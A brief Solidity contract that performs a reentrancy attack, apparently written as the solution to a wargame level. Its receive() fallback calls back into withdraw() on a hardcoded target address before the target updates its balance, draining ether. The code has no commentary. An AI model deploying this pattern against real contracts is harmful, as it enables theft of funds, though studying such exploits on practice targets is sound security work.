pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract Reentrance {
    IReentrance r = IReentrance(0x9335EF8Dd8b93449bDa65C7134D5Ffa86047C00e);
    uint256 deposit = 1e15;
    bool enter = false;

    function withdraw() public {
        r.withdraw(deposit);
    }

    receive() external payable {
        if(!enter) {
            enter = true;
            r.withdraw(deposit);
        }
    }
}